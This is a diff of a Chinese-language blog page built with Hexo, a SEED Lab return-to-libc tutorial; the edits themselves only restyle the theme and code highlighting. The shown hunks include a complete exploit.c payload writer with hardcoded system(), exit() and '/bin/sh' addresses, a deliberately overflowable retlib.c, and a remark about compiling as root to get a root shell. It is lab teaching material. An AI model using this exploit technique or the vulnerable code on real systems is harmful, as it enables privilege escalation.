@@ -5,7 +5,7 @@
   
 
 
-<html class="theme-next muse use-motion" lang="zh-Hans">
+<html class="theme-next mist use-motion" lang="zh-Hans">
 <head>
   <meta charset="UTF-8"/>
 <meta http-equiv="X-UA-Compatible" content="IE=edge" />
@@ -108,7 +108,7 @@
 <meta property="og:image" content="http://i.imgur.com/qkflPn4.png">
 <meta property="og:image" content="http://i.imgur.com/RHD2w3J.png">
 <meta property="og:image" content="http://i.imgur.com/CFdjcrV.png">
-<meta property="og:updated_time" content="2017-05-16T10:19:43.123Z">
+<meta property="og:updated_time" content="2017-05-18T14:16:20.077Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="seedLab:returnToLibc">
 <meta name="twitter:description" content="声明该教程是根据Seed Lab: return-to-libc的实验要求所写的，该教程只是演示了一下return-to-libc的一些基本的攻击原理，由于关了编译器及系统的一些保护措施，所以并不能在实际的情况下实现攻击(′▽`〃)一：背景介绍DEP数据执行保护  溢出攻击的根源在于现代计算机对数据和代码没有明确区分这一先天缺陷，就目前来看重新去设计计算机体系结构基本上是不可能的，我们只能靠向前兼">
@@ -123,7 +123,7 @@
   var NexT = window.NexT || {};
   var CONFIG = {
     root: '/',
-    scheme: 'Muse',
+    scheme: 'Mist',
     sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
     fancybox: true,
     motion: true,
@@ -459,10 +459,10 @@
 <p>0x62615a59代表的char为baZY，因为它是大端法表示的，所以为YZab，在地buffer的24-27偏移处。所以X为24。</p>
 <p>由图1可知道栈的结构，即return地址的下面4个字节为要返回的下个地址指针，再下面4个字节为函数参数，所以24+4=28处存取exit()的函数，24+8=32出存取/bin/sh字符串的地址</p>
 <h4 id="编写exploit程序"><a href="#编写exploit程序" class="headerlink" title="编写exploit程序"></a>编写exploit程序</h4><p>所以exploit.c的程序如下所示:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">int main(int argc, char **argv)</div><div class="line">&#123;</div><div class="line">  char buf[40];</div><div class="line">  FILE *badfile;</div><div class="line"></div><div class="line">  badfile = fopen(&quot;./badfile&quot;, &quot;w&quot;);</div><div class="line">  int i;</div><div class="line">  for(i = 0;i &lt; 40;i++)</div><div class="line"> buf[i] = 0x90;</div><div class="line"></div><div class="line">  /* You need to decide the addresses and </div><div class="line"> the values for X, Y, Z. The order of the following </div><div class="line"> three statements does not imply the order of X, Y, Z.</div><div class="line"> Actually, we intentionally scrambled the order. */</div><div class="line">  *(long *) &amp;buf[32] = 0xb7f80fb8 ;   //  &quot;/bin/sh&quot;</div><div class="line">  *(long *) &amp;buf[24] = 0xb7e5f430 ;   //  system()</div><div class="line">  *(long *) &amp;buf[28] = 0xb7e52fb0 ;   //  exit()</div><div class="line"></div><div class="line">  fwrite(buf, sizeof(buf), 1, badfile);</div><div class="line">  fclose(badfile);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> buf[<span class="number">40</span>];</div><div class="line">  FILE *badfile;</div><div class="line"></div><div class="line">  badfile = fopen(<span class="string">"./badfile"</span>, <span class="string">"w"</span>);</div><div class="line">  <span class="keyword">int</span> i;</div><div class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">40</span>;i++)</div><div class="line"> buf[i] = <span class="number">0x90</span>;</div><div class="line"></div><div class="line">  <span class="comment">/* You need to decide the addresses and </span></div><div class="line"> the values for X, Y, Z. The order of the following </div><div class="line"> three statements does not imply the order of X, Y, Z.</div><div class="line"> Actually, we intentionally scrambled the order. */</div><div class="line">  *(<span class="keyword">long</span> *) &amp;buf[<span class="number">32</span>] = <span class="number">0xb7f80fb8</span> ;   <span class="comment">//  "/bin/sh"</span></div><div class="line">  *(<span class="keyword">long</span> *) &amp;buf[<span class="number">24</span>] = <span class="number">0xb7e5f430</span> ;   <span class="comment">//  system()</span></div><div class="line">  *(<span class="keyword">long</span> *) &amp;buf[<span class="number">28</span>] = <span class="number">0xb7e52fb0</span> ;   <span class="comment">//  exit()</span></div><div class="line"></div><div class="line">  fwrite(buf, <span class="keyword">sizeof</span>(buf), <span class="number">1</span>, badfile);</div><div class="line">  fclose(badfile);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>在前面步骤获得了system()，exit()和/bin/sh在内存的地址，以及return在buffer的偏移地址，所以可以按照上面获得的信息来补全exploit.c的程序。</p>
 <p>retlib.c程序:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">/* This program has a buffer overflow vulnerability. */</div><div class="line">/* Our task is to exploit this vulnerability */</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">int bof(FILE *badfile)</div><div class="line">&#123;</div><div class="line">char buffer[12];</div><div class="line"></div><div class="line">/* The following statement has a buffer overflow problem */</div><div class="line">fread(buffer, sizeof(char), 40, badfile);</div><div class="line"></div><div class="line">return 1;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char **argv)</div><div class="line">&#123;</div><div class="line">FILE *badfile;</div><div class="line"></div><div class="line">badfile = fopen(&quot;badfile&quot;, &quot;r&quot;);</div><div class="line">bof(badfile);</div><div class="line"></div><div class="line">printf(&quot;Returned Properly\n&quot;);</div><div class="line"></div><div class="line">fclose(badfile);</div><div class="line">return 1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* This program has a buffer overflow vulnerability. */</span></div><div class="line"><span class="comment">/* Our task is to exploit this vulnerability */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">bof</span><span class="params">(FILE *badfile)</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">char</span> buffer[<span class="number">12</span>];</div><div class="line"></div><div class="line"><span class="comment">/* The following statement has a buffer overflow problem */</span></div><div class="line">fread(buffer, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="number">40</span>, badfile);</div><div class="line"></div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">FILE *badfile;</div><div class="line"></div><div class="line">badfile = fopen(<span class="string">"badfile"</span>, <span class="string">"r"</span>);</div><div class="line">bof(badfile);</div><div class="line"></div><div class="line"><span class="built_in">printf</span>(<span class="string">"Returned Properly\n"</span>);</div><div class="line"></div><div class="line">fclose(badfile);</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>在编译retlib.c程序时，用root权限编译，这样在运行/bin/sh程序时即可提权。</p>
 <p>提权结果如下：</p>
 <p><img src="http://i.imgur.com/CFdjcrV.png" alt=""></p>
@@ -645,6 +645,17 @@
 
         <div class="links-of-author motion-element">
           
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/bin2415" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  Github
+                </a>
+              </span>
+            
+          
         </div>
 
         
@@ -690,7 +701,7 @@
       <div class="footer-inner">
         <div class="copyright" >
   
-  &copy; 
+  &copy;  2016 - 
   <span itemprop="copyrightYear">2017</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
@@ -706,7 +717,7 @@
 <div class="theme-info">
   主题 -
   <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
-    NexT.Muse
+    NexT.Mist
   </a>
 </div>
 
@@ -1292,6 +1303,9 @@
   
 
   
+  <script type="text/javascript" src="/js/src/js.cookie.js?v=5.1.1"></script>
+  <script type="text/javascript" src="/js/src/scroll-cookie.js?v=5.1.1"></script>
+
 
   
 
